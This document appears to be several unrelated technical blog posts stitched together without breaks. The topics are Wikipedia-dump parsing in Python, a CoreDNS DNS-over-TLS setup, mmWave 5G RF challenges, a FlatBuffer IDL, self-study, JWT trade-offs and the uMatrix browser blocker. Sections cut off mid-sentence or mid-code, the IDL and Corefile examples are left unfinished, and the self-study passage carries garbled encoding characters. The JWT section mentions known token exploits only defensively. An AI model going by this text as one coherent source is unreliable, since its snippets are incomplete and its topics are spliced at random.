<div><div><pre><code><span>with</span> <span>open</span><span>(</span><span>file</span><span>,</span> <span>'r'</span><span>,</span> <span>encoding</span><span>=</span><span>'utf-8'</span><span>)</span> <span>as</span> <span>infile</span><span>:</span>
    <span>for</span> <span>line</span> <span>in</span> <span>infile</span><span>:</span>
        <span>line</span> <span>=</span> <span>literal_eval</span><span>(</span><span>f'"""</span><span>{</span><span>line</span><span>}</span><span>"""'</span><span>)</span>  <span># this works... sometimes
</span>        <span>if</span> <span>'&lt;page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># new article
</span>            <span>article</span> <span>=</span> <span>''</span>
        <span>elif</span> <span>'&lt;/page&gt;'</span> <span>in</span> <span>line</span><span>:</span>  <span># end of article
</span>            <span>article</span> <span>+=</span> <span>line</span>
</code></pre></div></div>

<p>This works great for just reading the thing one at a time. One consistency in the Wikipedia dumps is that every page starts and ends with <code>&lt;page&gt;</code> and <code>&lt;/page&gt;</code> respectively.
This served as a great demarcation. So I tried to handle the unicode literals as they were coming in with <a href="https://www.kite.com/python/docs/ast.literal_eval">ast.literal_eval</a>. 
Spoiler: It worked. A little bit. This function frequently bombs out for various reasons.</p>

<h2 id="attempt-2---existing-parsers">Attempt 2 - Existing Parsers</h2>

<p>I finally gave up on manually parsing WikiMedia Text and found some extant parsers. First up is <a href="https://pypi.org/project/wikitextparser/">wikitextparser</a> which, as of this writing, is actively maintained.
Second up was the simple <a href="https://pypi.org/project/html2text/">html2text</a> which got some of the stuff the first missed. These premade parsers are great in that they 
don’t require me to use any of my own brain power! They are, however, far slower than my regex replace functions. It can’t be avoided, though.</p>

<p>So now my output looks more like this:</p>

<div><div><pre><code><span>[</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"4413617"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"The Samajtantrik Sramik Front is a national trade union federation in Bangladesh. It is affiliated with the World Federation of Trade Unions..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Samajtantrik Sramik Front"</span><span>
 </span><span>},</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"2618"</span><span>,</span><span>
  </span><span>"text"</span><span>:</span><span> </span><span>"Aeacus (; also spelled Eacus; Ancient Greek: </span><span>\u</span><span>0391</span><span>\u</span><span>1f30</span><span>\u</span><span>03b1</span><span>\u</span><span>03ba</span><span>\u</span><span>03cc</span><span>\u</span><span>03c2 Aiakos or Aiacos) was a mythological king of the island of Aegina..."</span><span>,</span><span>
  </span><span>"title"</span><span>:</span><span> </span><span>"Aeacus"</span><span>
 </span><span>},</span><span>
 </span><span>{</span><span>
  </span><span>"id"</span><span>:</span><span> </span><span>"3201"</span><span>,</span><span>

  </span><span>"title"</span><span>:</span><span> </span><span>"Attribution of recent climate change"</span><span>
 </span><span>},</span><span>
</span><span>]</span><span>
</span></code></pre></div></div>

<p>It’s much cleaner and moving in the right direction but I still have to figure out the literal eval reliably and a few square brackets are making it through as well. 
These premade parsers are far slower but one advantage of cleaning up Wikipedia articles is that they end up far smaller without the markup. If you just want the accumulated 
knowledge in plain text format, it ends up being a fraction of the size.</p>

<p>It’s not the most elegant solution but for just over 100 lines of code, it will parse almost all of Wikipedia and save it to 40MB chunks of JSON.
Running this script looks like the following:</p>

    <p><time>November 27, 2020</time></p><div>
        <p>Although <a href="https://transparencyreport.google.com/https/overview?hl=en&amp;time_os_region=chrome-usage:1;series:time;groupby:os&amp;lu=load_os_region&amp;load_os_region=chrome-usage:1;series:page-load;groupby:os">an increasing portion of the web is adopting HTTPS</a>, a core part of the web infrastrcture lags behind in the form of plaintext DNS. The authentication problem of DNS is resolved by DNSSEC, but the queries are still plaintext. There’s currently a number of competing solutions that offer both authenticity and privacy concerns, namely DNS-over-TLS, DNS-over-HTTPS, and <a href="https://dnscrypt.info/">DNSCrypt</a>. I’ll leave it to Cloudflare’s blog to explain DNS, DoT and DoH, and the work towards both: <a href="https://blog.cloudflare.com/dns-encryption-explained/">DNS Encryption Explained</a>. Due to operating systems not yet supporting encrypted DNS resolvers, some work needs to be done by the user, and this post describes part of the work using <a href="https://coredns.io/">CoreDNS</a>.</p>
<p>CoreDNS is pluggable DNS and service discovery server written in Go and the blessed DNS resolver of Kubernetes. Configuring CoreDNS is handled via setting up a series of <a href="https://coredns.io/plugins/">middlewares</a> in the Corefile, which is what its config file is called. The <a href="https://coredns.io/manual/toc/">CoreDNS Manual</a> page does a brilliant job describing what CoreDNS is, how it works, how to install it, the structure of the configuration file, and more. To build our secure resolver, let’s pick up one of the examples off that page and gradually build the enhanced version.</p>
<p>Start by creating a file named <code>Corefile</code> containing the following, which is lifted verbatim from CoreDNS website:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.</span> <span>{</span>
    <span>forward</span> <span>.</span> <span>8</span><span>.8.8.8</span> <span>9</span><span>.9.9.9</span>
    <span>log</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>This is very simple, but let’s break it apart. The <code>.</code> means listen on port 53, the default port for UDP DNS, and across all interfaces. The configuration instructs CoreDNS to forward all requests to either <code>8.8.8.8</code> (Google DNS) or <code>9.9.9.9</code> (Quad9), picking either of them at random, and logs everything to stdout. This is not secure yet. This setup will forward all DNS queries in plaintext UDP packets. Let’s start by forwarding everything to <a href="https://developers.google.com/speed/public-dns/docs/dns-over-tls">Google DNS over TLS</a> resolvers without fallback:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.</span> <span>{</span>
    <span>forward</span> <span>.</span> <span>tls://8.8.8.8</span> <span>tls://8.8.4.4</span> <span>{</span><span>
</span><span>		# This tells CoreDNS the subject name
</span><span>		# on the certificate is: dns.google
</span><span></span>		<span>tls_servername</span> <span>dns.google</span>
	<span>}</span>
    <span>log</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>At this point the setup has redundancy against Google’s services only. What if Google DNS service is down? The possibiity of a service going down is not far fetched, and we must account for it. However, note how the <code>tls_servername</code> directive can only be defined once, so it is bound to whatever upstream IP address we’re using. We can get around this by breaking the upstream into more local resolvers. I’ll add Cloudflare DNS as backup:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span><span>14
</span></code></pre></td>
<td>
<pre><code data-lang="caddyfile"><span>.:53</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>127.0.0.1</span><span>:</span><span>5301</span> <span>127.0.0.1</span><span>:</span><span>5302</span> <span>[</span><span>::1</span><span>]</span><span>:5301</span> <span>[</span><span>::1</span><span>]</span><span>:5302</span>
	<span>log</span>
<span>}</span>
<span>.:5301</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>tls://8.8.8.8</span> <span>tls://8.8.4.4</span> <span>{</span>
		<span>tls_servername</span> <span>dns.google</span>
	<span>}</span>
<span>}</span>
<span>.:5302</span> <span>{</span>
	<span>forward</span> <span>.</span> <span>tls://1.1.1.1</span> <span>tls://1.0.0.1</span> <span>{</span>
		<span>tls_servername</span> <span>cloudflare-dns.com</span>
	<span>}</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Now we have established the pattern. To add more backups, add more server blocks where the upstream is defined and the respective <code>tls_servername</code> is configured, and add the localhost IP address to the main server of <code>.:53</code>. This can be further enhanced by adding caching, prefetching, and loading the <code>hosts</code> file. The final setup will look like this:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>For the past few years we’ve been hearing about mmWave 5G and now, in 2020 it’s finally here! mmWave 5G promises amazing speeds of 10 Gigabits/second, very low latency of around 1 millisecond, and many other amazing features. It currently operates in the frequency range between 24 GHz and 40 GHz. </p>



<p>Verizon has deployed this technology in many major cities across the USA. Here is a map that shows Verizon’s mmWave or <a rel="noreferrer noopener" href="https://www.verizon.com/about/news/fastest-5g-network-world-just-got-bigger-and-better" target="_blank">Ultra Wideband 5G</a> deployments.  </p>







<figure><img loading="lazy" width="1024" height="399" src="https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-1024x399.png" alt="" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-1024x399.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-300x117.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-768x299.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G-1536x598.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/Verizon-5G.png 2031w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>mmWave 5G or 5G Ultra Wideband deployments in USA</figcaption></figure>



<p>While mmWave 5G deployments have been limited to date, they will grow over time. Verizon will also be deploying Sub-6 GHz 5G networks this year. As the name suggests these networks will be deployed at frequencies below 6 GHz. </p>



<p>In 2020 we have also seen many new 5G phones – some of which <a href="https://amzn.to/3ffJ30C">support mmWave</a> and <a href="https://amzn.to/3923Cwy">others that don’t</a>.</p>



<h4><strong>The biggest differences between mmWave 5G and all other wireless systems</strong></h4>



<p>As the name suggests, mmWave 5G operates at mmWave frequencies starting at 24 GHz. Why do we need to move to mmWave frequencies? To support higher upload and download speeds we need more bandwidth. A single channel of mmWave 5G can be 400 MHz wide. That large amount of contiguous bandwidth is simply not available at lower frequencies as almost all the spectrum has already been allocated for other applications. </p>



<p>The picture below shows the bandwidth of 5G systems relative to other cellular technologies. </p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-1024x236.png" alt="" width="690" height="159" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-1024x236.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-300x69.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths-768x177.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/2g3g4g5g-bandwidths.png 1446w" sizes="(max-width: 690px) 100vw, 690px"><figcaption>Bandwidths of cellular technologies</figcaption></figure></div>



<p>The maximum bandwidth of 5G is 20 times larger than the maximum bandwidth of a 4G signal. That makes sense when you compare the theoretical maximum achievable speed of a 4G network at 300 Mbps with that of a 5G network at 10,000 Mbps.  </p>



<h4><strong><span>Let’s now take a look at some of the major RF related challenges with mmWave 5G relative to previous generations of wireless systems</span></strong></h4>



<h3><strong>Radio Signals in the Real World</strong></h3>



<p>To put things in context, we have never operated our cellular communication systems at mmWave frequencies. The highest we have operated at is around 2 GHz for 4G systems and 6 GHz for Wi-Fi systems.</p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1024x576.png" alt="" width="669" height="376" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/frequency-ranges.png 1600w" sizes="(max-width: 669px) 100vw, 669px"><figcaption>Frequency ranges for different wireless technologies</figcaption></figure></div>



<p>The only wireless systems we have implemented at mmWave frequencies are point-to-point, line-of-sight links. We will, for the first time ever, have to deal with operating in challenging mmWave RF environments. </p>



<p>What does that mean?</p>



<p>mmWave signals don’t propagate very far. They are in fact obstructed by even the smallest of objects on account of their small wavelength. Trees, buildings, moisture – all affect mmWave signal propagation. As a result, cities and suburbs are very challenging environments from a mmWave perspective. </p>



<div><figure><img loading="lazy" width="1024" height="576" src="https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1024x576.png" alt="" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1024x576.png 1024w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-300x169.png 300w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-768x432.png 768w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G-1536x864.png 1536w, https://www.onesdr.com/wp-content/uploads/2020/11/objects-that-affect-5G.png 1600w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Things that affect mmWave 5G signals</figcaption></figure></div>



<p>So how do we propose to solve the problem? The plan is to deploy about five times as many 5G base stations as with 4G and to use a technology called beamforming. As the name suggests this focuses RF energy beams in specific directions – toward users in particular. </p>



<p>However there still remains the fact that we have a relatively poor understanding of how exactly RF behaves at these frequencies in city environments where things change fast. Buildings and other structures appear relatively quickly and sometimes unexpectedly. The behavior of RF signals will then change accordingly and often unpredictably.</p>



<p>Unlike with previous systems operating at 2 GHz, we have not had the benefit of four decades of research and development. We have barely had two years to develop an understanding of how mmWave will work.</p>



<h3><strong>Complex Phone Development</strong></h3>



<p>The average phone today has multiple wireless sub-systems operating in it. Everything from 2G to 4G with Wi-Fi, Bluetooth, NFC and sometimes even FM. In small cell phone dimensions this is potentially chaos from an RF standpoint with signals interfering with one another. Increased power consumption of mmWave components is another significant issue as it results in more heat dissipation and lower battery life.</p>



<div><figure><img loading="lazy" src="https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards.png" alt="" width="332" height="373" srcset="https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards.png 703w, https://www.onesdr.com/wp-content/uploads/2020/11/phone-with-multiple-standards-267x300.png 267w" sizes="(max-width: 332px) 100vw, 332px"><figcaption>Different wireless technologies in a phone today</figcaption></figure></div>



<h3><strong>Higher Build and Development Costs</strong></h3>



<p>mmWave phones have multiple RF antenna modules designed to improve signal reception – a complex task without a doubt. Each of these has its own amplification, power management and transceiver. This complexity adds to the cost of hardware and results in a factor of <a href="https://benchmarking.ihsmarkit.com/614670/the-first-5g-phone-in-the-united-states-is-a-compromise-of-cost-and-design-ihs-markit-says" target="_blank" rel="noreferrer noopener">three times higher</a> relative to the average 4G smartphone.</p>



<p><a href=""></a>What about testing mmWave phones on the manufacturing floor? As mentioned earlier, most of our wireless communication systems have been operating below 2 GHz. Even when you consider Wi-Fi, we don’t get any higher than 6 GHz. There are a number of RF testing products such as <a href="https://amzn.to/3fg0luz">spectrum analyzers </a>and <a href="https://amzn.to/2UFEG5N">signal generators</a> that operate up to 6 GHz. They are not very expensive. 5G mmWave however requires test equipment that has to cover 40 GHz at least. Such equipment can cost as much as $100,000 or more. Not very affordable at all.</p>



<h2><strong>Summary</strong></h2>



<p>In this post we have talked about some of the RF challenges that we need to overcome to make mmWave 5G a success. We provided an overview of about three broad areas: RF propagation, Phone hardware and Development costs. The challenges in each of these areas are very daunting but exciting at the same time.</p>

      <h2 id="flatbuffer-as-serialization-agnostic-idl">FlatBuffer as serialization agnostic IDL</h2>

<p>Many popular IDLs mix the following two separate concerns into one leading to less than optimal results.</p>

<ul>
  <li>Language agnostic type system supporting enums, types and variants/unions.</li>
  <li>RPC oriented wire format with backward compatibility as a first class concern</li>
</ul>

<p>Mixing these two concerns has many downsides. The first one is the weakening of the type system.
Suppose we have a union containing two things:</p>



<p>The generated code from the IDL compiler may add a third state - “not defined” or similar to deal with the
case that the RPC was sent from an old client. This concern now permeates code at other layers in the stack
where one doesn’t necessarily need to worry about this third state. This could happen for example if we fail
the request at the lower levels of the stack and deal with only two possibilities in the application logic.</p>

<p>Secondly, scalars and types may have different syntax in how optionality is expressed. My understanding is that
this is also driven by the serialization concern in the flatbuffer IDL.</p>

<h2 id="what-about-serialziation-then">What about serialziation then?</h2>

<p>Yes, someone has to do the work for serialization. A good way forward is to do it in a language specific library.
Rust has <code>serde</code> and Python has pure-protobuf.</p>

<div><div><pre><code>@message
@dataclass
class Cat:
    name: str
    age: int
</code></pre></div></div>

<h2 id="example-idl">Example IDL</h2>

<p>This work (<a href="http://github.com/adsharma/flattools">flattools</a>) separates these two concerns as described above. It adopts the flatbuffer IDL (since it doesn’t have the
field numbering concern in the IDL, significantly simplyfying the language). Attributes have been used to support 
high level type safe concepts such as Protocols and Views (a concept similar to graphql fragments).</p>

<p>Here is a flatbuffer derived IDL file.</p>

<div><div><pre><code>enum Color : byte { Red = 1, Green, Blue }

table NamedAnimal (protocol) {
    name : string (required);
    age : short;
}

table Colorophile (view) {
    favorite_color: Color;
}

table Animal {
    name : string (required);
    length: ulong;
}

// Some languages prefer protocols like NamedAnimal

A person who self studies is called an </span><span><span><span><strong>autodidact</strong></span></span></span><span> from the Greek word, </span><span><span><span><strong>autodidaktos</strong></span></span></span><span>; autos â€˜selfâ€™ + didaskein â€˜teachâ€™.</span></span></p><p><span><span>Before the start of the digital revolution back in the 1990s, self-learning is an uphill task. You would have to go to a physical library in the day to read reference books and visit your teacher at school during office hours to ask questions. The concept of â€˜just google itâ€™ has not existed yet.</span></span></p><p><span><span>It is even mind-boggling when I think about our ancestors who learned to patch wounds using herbs, calculated the time of the day using a stick, and discovered how to cook rice from grains. Were these knowledge being passed down? I donâ€™t think so. </span></span></p><p><span><span>Our ancestors observed and experimented. They essentially self-studied to discovery. As awe-striking as this may sound, our ancestors had it difficult and probably spent an entire lifetime experimenting. Fast-forward to the year 2020 â€” </span><span><span><span><strong>especially in 2020</strong></span></span></span><span> â€” the act of self-studying is ever more accessible and relevant.</span></span></p><p><span><span>How many times have we already heard of our friend Jane who studied programming on Udemy made it to Apple and Amazon, earning a 6-figure salary?</span></span></p><p><span><span>How many times have we already heard of our friend John who learned to edit videos on YouTube became a YouTube star himself, earning millions before the age of 25?</span></span></p><p><span><span>What took 4 years to learn and tens of thousands of dollars to burn can be achieved in just 7 months at a fraction of that cost, sometimes even for free. Those who seize these opportunities are riding the waves of success decades earlier than their traditional peers.</span></span></p><p><span><span>However, it is important to acknowledge that there are certain practices â€” like those that require a license to operate such as doctors and lawyers â€” while in essence can be self-learned, a formal education is a must to prove legitimacy.</span></span></p><p><span><span><span><span><strong>Now, how do you self-study?</strong></span></span></span><span><span><span> </span></span></span></span></p><p><span><span>While there are a myriad of answers to this, I will offer my own take which I hope will benefit you.</span></span></p><h2 id="block-21b76dc780d9464db7954543d0b47a54"><span id="21b76dc780d9464db7954543d0b47a54"></span><span><span>Find the right materials and stick to it</span></span></h2><p><span><span><span><span>â€¢ â€¢ â€¢</span></span></span></span></p><p><span><span>Finding the right materials is not an easy task.

              <p>This article provides an analysis of JWTs (JSON Web Tokens, pronounced “jot”) from how they are used to pros and cons of using JWTs in your application.</p>

<p>JWTs are becoming more and more ubiquitous. Customer identity and access management (CIAM) providers everywhere are pushing JWTs as the silver bullet for everything. JWTs are pretty cool, but let’s talk about some of the downsides of JWTs and other solutions you might consider.</p>

<p>One way to describe JWTs is that they are portable units of identity. That means they contain identity information as JSON and can be passed around to services and applications. Any service or application can verify a JWT itself. The service/application receiving a JWT doesn’t need to ask the identity provider that generated the JWT if it is valid. Once a JWT is verified, the service or application can use the data inside it to take action on behalf of the user.</p>

<p>Here’s a diagram that illustrates how the identity provider creates a JWT and how a service can use the JWT without calling back to the identity provider: (yes that is a Palm Pilot in the diagram)</p>

<p><img src="https://fusionauth.io/assets/img/blogs/Lets-talk-about-JWTs-Diagram-1.png" alt="JWT example"></p>

<p>When you contrast this with an opaque token, you’ll see why so many developers are using JWTs. Opaque tokens are just a large string of characters that don’t contain any data. A token must be verified by asking the identity provider if it is still valid and returning the user data the service needs.</p>

<p>Here’s a diagram that illustrates how the identity provider is called to verify the opaque token and fetch the user data:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/Lets-talk-about-JWTs-Diagram-2-1.png" alt="Opaque token example"></p>

<p>This method of verifying and exchanging tokens can be very “chatty” and it also requires a method of persisting and loading the tokens inside the identity provider. JWTs on the other hand don’t require any persistence or logic in the identity provider since they are portable.</p>

<p>There are a couple of things you should consider when deciding to use JWTs. Let’s look at a few of the main ones.</p>

<h2 id="jwts-expire-at-specific-intervals">JWTs expire at specific intervals</h2>

<p>When a JWT is created it is given a specific expiration instant. The life of a JWT is definitive and it is recommended that it is somewhat small (think minutes not hours). If you have experience with traditional sessions, JWTs are quite different. Traditional sessions are always a specific duration from the last interaction with the user. This means that if the user clicks a button, their session is extended. If you think about most applications you use, this is pretty common. You are logged out of the application after a specific amount of inactivity. JWTs on the other hand, are not extended on user interaction. Instead, they are programmatically replaced by creating a new JWT for the user.</p>

<p>To solve this problem, most applications use refresh tokens. Refresh tokens are opaque tokens that are used to generate new JWTs. Refresh tokens also need to expire at some point, but they can be more flexible in this mechanism because they are persisted in the identity provider. This also makes them similar to the opaque tokens described above.</p>

<h2 id="jwts-are-signed">JWTs are signed</h2>

<p>Since JWTs are cryptographically signed, they require a cryptographic algorithm to verify. Cryptographic algorithms are purposefully designed to be slow. The slower the algorithm, the higher the complexity, and the less likely that the algorithm can be cracked using brute-force.</p>

<p>On a quad-core MacBook Pro, about 200 JWTs can be created and signed per second using RSA public-private key signing. This number drops dramatically on virtualized hardware like Amazon EC2s. HMAC signing is much faster but lacks the same flexibility and security characteristics. Specifically, if the identity provider uses HMAC to sign a JWT, then all services that want to verify the JWT must have the HMAC secret. This means that all the services can now create and sign JWTs as well. This makes the JWTs less portable (specifically to public services) and less secure.</p>

<p>To give you an idea of the performance characteristics of JWTs and the cryptographic algorithms used, we ran some tests on a quad-core MacBook. Here are some of the metrics and timings we recorded for JWTs:</p>

<h2 id="jwts-arent-easily-revocable">JWTs aren’t easily revocable</h2>

<p>This means that a JWT could be valid even though the user’s account has been suspended or deleted. There are a couple of ways around this including the “refresh token revoke event” combined with a webhook. This solution is available in FusionAuth. You can check out the blog post I wrote on this topic here: <a href="https://fusionauth.io/learn/expert-advice/tokens/revoking-jwts" title="Learn about Revoking JWTs">Revoking JWTS</a> and also watch the IBM webinar where I presented our solution here (when FusionAuth was still called Passport): <a href="https://developer.ibm.com/tv/learn-how-to-revoke-json-web-tokens/" title="Jump to IBM Developer site">Learn how to revoke JSON Web Tokens</a>.</p>

<h2 id="jwts-have-exploits">JWTs have exploits</h2>

<p>This is more a matter of bad coding than flaws that are inherent to JWTs. The “none” algorithm and the “HMAC” hack are both well know exploits of JWTs. I won’t go into details about these exploits here, but if you search around a bit you can find many discussions of them.</p>

<p>Both of these exploits have simple fixes. Specifically, you should never allow JWTs that were created using the “none” algorithm. Also, you should not blindly load signing keys using the “kid” header in the JWT. Instead, you should validate that the key is indeed the correct key for the algorithm specified in the header.</p>

<h2 id="sessions-as-an-alternative">Sessions as an Alternative</h2>

<p>Instead of using JWTs or opaque tokens, you always have the option of using sessions. Sessions have been around for over two decades and are proven technology. Sessions generally work through the use of cookies and state that is stored on the server. The cookie contains a string of characters that is the session id. The server contains a large Hash that keys off the session id and stores arbitrary data.</p>

<p>When a user logs in, the user object is stored in the session and the server sends back a session cookie that contains the session id. Each subsequent request to the server includes the session cookie. The server uses the session cookie to load the user object out of the session Hash. The user object is then used to identify the user making the request. Here are two diagrams that illustrate this concept:</p>

<h3 id="login">Login</h3>

<p><img src="https://fusionauth.io/assets/img/blogs/Lets-talk-about-JWTs-Diagram-3-1.png" alt="login example for sessions"></p>

<h3 id="second-request">Second request</h3>

<p><img src="https://fusionauth.io/assets/img/blogs/Lets-talk-about-JWTs-Diagram-4-2.png" alt="API call with session example"></p>

<p>If you have a smaller application that uses a single backend, sessions work well. Once you start scaling or using microservices, sessions can be more challenging. Larger architectures require load-balancing and session pinning, where each client is pinned to the specific server where their session is stored. Session replication or a distributed cache might be needed to ensure fault tolerance or allow for zero-downtime upgrades. Even with this added complexity, sessions might still be a good option.</p>

<p>I hope this brief overview of JWTs and Sessions has been helpful in shedding some light on these technologies that are used to identity and manage users. Either of these solutions will work in nearly any application. The choice generally comes down to your needs and the languages and frameworks you are using.</p>

          <p>Saturday, October 21st, 2017</p>
          <p><img loading="lazy" alt="" height="196" src="https://www.electricmonk.nl/log/wp-content/uploads/2017/10/popups-1.jpg" title="" width="269">As happens with all media, once corporations join in because there is money to be made, things quickly devolve into a flaming heap of shit. The internet is no exception to this rule. With the coming of Javascript and DHTML in the late 90’s, ads soon started appearing on the web. Not long after, pop-ups – either with or without ads –&nbsp;became a common sighting. This set off a back-and-forth war of browsers trying to block annoyances such as pop-ups and advertisers coming up with innovative ways to annoy the crap out of everybody. What started with still images of ads, much like you’d have on traditional paper, soon changed into a moving, blinking, automatically playing audio and video crapfest.</p>
<p>Because the basics underlying the web are insecure-by-design, it is possible for browsers to make requests to any website in the world from any website you decide to visit. This of course was quickly picked up by content publishers, the media and advertisers alike, to track your every move on the internet in order to shove more lukewarm shit down the throats of the average consumer.</p>
<h2>The rise and fall of ad blockers</h2>
<p>The answer to this came in the form of Ad blockers: separate programs or extensions you install in your browser. They&nbsp;have a predefined list of ad domains&nbsp;that they’ll block from loading. Naturally this upset the media and advertisers, some of whom equate it with stealing. One has to wonder if ignoring ads in the newspaper is also considered stealing. At any rate, it’s hard to be sympathetic&nbsp;with the poor thirsty vampires in the advertising industry. They’ve shown again and again that they can’t self-regulate their own actions.&nbsp; They’ll go through great lengths to annoying you into buying their crap and violating your privacy in the most horrible ways, all for a few extra eyeballs<a href="#note_1"> <sup>*</sup></a>.</p>
<p>Unfortunately, much like how the zombies refuse to stay dead once slain, so do the annoying features on the web. For the past few years the media, content producers, advertisers&nbsp;and basically everybody else have&nbsp;decided to redouble their efforts in the Annoyance Wars with such things as Javascript / HTML5 pop-ups begging to sign up to their newsletters, automatically playing HTML5 videos, auto-loading of (or worse:&nbsp;redirecting to)&nbsp;the next article, detection of adblockers, bitcoin mining Javascript software&nbsp;running in the background when you visit a site, ever increasing and deeper tracking, super cookies, tracking pixels, the use of CDNs, etc.</p>
<p>For example, CNN’s site loads resources from a staggering <strong>61 domains</strong>. That’s 61 places that can track you. <strong>30&nbsp;of those are known to track you</strong> and include Facebook, Google, a variety of specialized trackers, ad agencies, etc. It tries to <strong>run over 40 scripts</strong> and tries to place <strong>8 cookies</strong>. And this is&nbsp;<em>only</em>&nbsp;from allowing scripts! I did not allow cross-site background requests or any of the blocked domains. I’m sure if I unblocked those, there would be much, much more.</p>
<p><img loading="lazy" alt="" height="799" src="https://www.electricmonk.nl/log/wp-content/uploads/2017/10/Screenshot_2017-10-21_14-17-01-1.png" width="510" srcset="https://www.electricmonk.nl/log/wp-content/uploads/2017/10/Screenshot_2017-10-21_14-17-01-1.png 510w, https://www.electricmonk.nl/log/wp-content/uploads/2017/10/Screenshot_2017-10-21_14-17-01-1-191x300.png 191w" sizes="(max-width: 510px) 100vw, 510px"></p>
<p>To top it all off, advertisers have decided to go to the root of the problem, and have simply bought most ad blockers. These were then modified&nbsp;to let through certain&nbsp;“approved” ads.&nbsp;The sales pitch they give us is that they’ll only allow nonintrusive ads. Kinda like a fifty-times convicted felon telling the parole board that he’ll truly be good this time. In some cases they’ve even built tracking software directly in the ad blockers themselves. In other cases they’re basically extorting money from websites in exchange for&nbsp;letting their ads through.</p>
<h2>Bringing out the big guns</h2>
<p>So… our ad blockers are being taken over by the enemy. Our browsers are highly insecure by default. Every site can send and retrieve data from&nbsp;any place on the web. Browsers can use our cameras, microphones and GPUs. The most recent addition is the ability to show notifications on our desktops. A feature that, surprise surprise, was quickly picked up by sites to shove more of their crap in our faces.&nbsp;&nbsp;Things&nbsp;are only going to get worse as browsers get more and&nbsp;more access to&nbsp;our PCs. The media has shown that they don’t give a rats ass about your privacy or rights as long as there’s a few cents to make. The world’s most-used browser is built by a company that lives off advertising. Have we lost the war? Do we just resign ourselves to the fact that we’ll be tracked, spied upon, lied to, taken advantage of and spoon-fed advertisements like obedient little consumers every time we open a webpage?</p>
<p><strong>No.</strong></p>
<p>Enter <a href="https://chrome.google.com/webstore/detail/umatrix/ogfcmafjalglgifnmanfmnieipoejdcf?hl=en">umatrix</a>.&nbsp;</p>
<p><img loading="lazy" height="615" src="https://www.electricmonk.nl/docs/umatrix_tutorial/ani_sections.gif" width="528"></p>
<p>Umatrix is like a firewall for your browser. It stops web pages from doing&nbsp;<em>anything</em>. They can’t set cookies, they can’t load CSS or images. They can’t run scripts, use iframes or&nbsp;send data to themselves or to other sites. Umatrix blocks&nbsp;<em>everything</em>. Umatrix is what browsers should be doing by default. Ad blockers are just not enough. They only block ads and then only the ones they know about. To get any decent kind of protection of your privacy, you always needed at least an Adblocker, a privacy blocker such as Privacy Badger and a script blocker such as Noscript. Umatrix replaces&nbsp;<em>all</em>&nbsp;of those, and does a better job at it too.</p>
<p>Umatrix gives you full insight into what a website is trying to do. It gives you complete control over what a website is and isn’t allowed&nbsp;to do. It has a bit of a learning curve, which is why I <a href="https://www.electricmonk.nl/docs/umatrix_tutorial/umatrix_tutorial.html">wrote a tutorial for it</a>.</p>
<p>When you just start out using umatrix, you’ll find that many sites don’t work properly. On the other hand, many sites work a lot better.&nbsp;If you take a little time to unblock things so that your favorite sites work again (and save those changes), you’ll notice within a few hours that it’s not so bad. Umatrix is still for technical users and even those might find it too much of a chore. I find it worth the small effort to unblock things if that means my privacy stays intact. And more importantly, I’m never annoyed anymore by ads or&nbsp;pop-ups, plus I’m much less likely to accidentally run some malicious javascript.</p>
<p>This is what a CNN article looks like with Umatrix enabled and only allows first-party (<code>*.cnn.com</code>) CSS and images, which I have set as the default:</p>
